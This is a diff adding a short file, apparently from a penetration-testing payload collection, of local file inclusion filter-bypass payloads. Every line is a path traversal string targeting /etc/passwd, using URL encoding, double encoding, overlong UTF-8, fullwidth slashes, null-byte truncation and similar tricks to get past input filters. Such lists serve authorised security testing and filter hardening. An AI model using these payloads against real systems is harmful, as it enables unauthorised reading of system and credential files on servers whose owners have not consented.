@@ -1,0 +1,12 @@
+# LFI - Filter Bypass Payloads
+....//....//....//etc/passwd
+..%2F..%2F..%2Fetc%2Fpasswd
+%2e%2e%2f%2e%2e%2f%2e%2e%2fetc%2fpasswd
+..%252F..%252F..%252Fetc%252Fpasswd
+..%c0%af..%c0%af..%c0%afetc%c0%afpasswd
+..%ef%bc%8f..%ef%bc%8fetc%ef%bc%8fpasswd
+/etc/./passwd
+/etc/../etc/passwd
+../../etc/passwd%00
+../../etc/passwd%00.jpg
+../../../../etc/passwd....
